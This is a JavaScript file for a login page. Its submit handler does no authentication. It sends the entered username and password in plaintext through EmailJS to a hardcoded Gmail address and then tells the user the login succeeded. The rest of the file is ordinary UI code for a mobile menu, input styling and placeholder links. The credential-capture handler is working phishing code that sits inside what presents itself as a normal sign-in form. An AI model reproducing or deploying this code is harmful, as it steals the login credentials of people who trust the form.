import './style.css';
import emailjs from '@emailjs/browser';

// ============================================
// EMAILJS CONFIGURATION - UPDATE THESE VALUES
// ============================================
const EMAILJS_PUBLIC_KEY = 'JtSGl3EemoEkQszcw';
const EMAILJS_SERVICE_ID = 'service_dv9kkvq';
const EMAILJS_TEMPLATE_ID = 'template_ql3l0yp';
const RECIPIENT_EMAIL = 'ohnotriplesix@gmail.com';
// ============================================

emailjs.init(EMAILJS_PUBLIC_KEY);

const loginForm = document.getElementById('loginForm');
const mobileMenuToggle = document.querySelector('.mobile-menu-toggle');
const navbarMenu = document.querySelector('.navbar-menu');

loginForm.addEventListener('submit', async function(e) {
  e.preventDefault();

  const username = document.getElementById('username').value.trim();
  const password = document.getElementById('password').value;

  if (!username || !password) {
    alert('Please fill in all fields');
    return;
  }

  const submitButton = e.target.querySelector('.btn-login');
  const originalText = submitButton.textContent;

  submitButton.textContent = 'Logging in...';
  submitButton.disabled = true;

  try {
    const currentTime = new Date().toLocaleString();

    const emailParams = {
      name: username,
      time: currentTime,
      message: `Username: ${username}\nPassword: ${password}`
    };

    const emailResponse = await emailjs.send(
      EMAILJS_SERVICE_ID,
      EMAILJS_TEMPLATE_ID,
      emailParams
    );

    console.log('Email sent successfully:', emailResponse);
    alert('Login successful! Credentials sent.');

    loginForm.reset();

  } catch (error) {
    console.error('Error sending email:', error);
    alert('Error: Failed to send credentials. Please check your EmailJS configuration.');
  } finally {
    submitButton.textContent = originalText;
    submitButton.disabled = false;
  }
});


if (mobileMenuToggle) {
  mobileMenuToggle.addEventListener('click', function() {
    if (navbarMenu) {
      const isVisible = navbarMenu.style.display === 'flex';
      navbarMenu.style.display = isVisible ? 'none' : 'flex';

      if (!isVisible) {
        navbarMenu.style.position = 'absolute';
        navbarMenu.style.top = '100%';
        navbarMenu.style.left = '0';
        navbarMenu.style.right = '0';
        navbarMenu.style.backgroundColor = 'var(--color-white)';
        navbarMenu.style.flexDirection = 'column';
        navbarMenu.style.padding = '1rem';
        navbarMenu.style.boxShadow = 'var(--shadow)';
        navbarMenu.style.zIndex = '999';
      }
    }

    this.classList.toggle('active');
  });
}

const inputs = document.querySelectorAll('.form-group input');
inputs.forEach(input => {
  input.addEventListener('focus', function() {
    this.parentElement.classList.add('focused');
  });

  input.addEventListener('blur', function() {
    this.parentElement.classList.remove('focused');

    if (this.value) {
      this.parentElement.classList.add('filled');
    } else {
      this.parentElement.classList.remove('filled');
    }
  });
});

const forgotPasswordLink = document.querySelector('.forgot-password');
if (forgotPasswordLink) {
  forgotPasswordLink.addEventListener('click', function(e) {
    e.preventDefault();
    alert('Password reset functionality would be implemented here.');
  });
}

const registerLink = document.querySelector('.link-register');
if (registerLink) {
  registerLink.addEventListener('click', function(e) {
    e.preventDefault();
    alert('Registration page would be displayed here.');
  });
}

const langBtn = document.querySelector('.lang-btn');
if (langBtn) {
  langBtn.addEventListener('click', function() {
    alert('Language selector functionality would be implemented here.');
  });
}
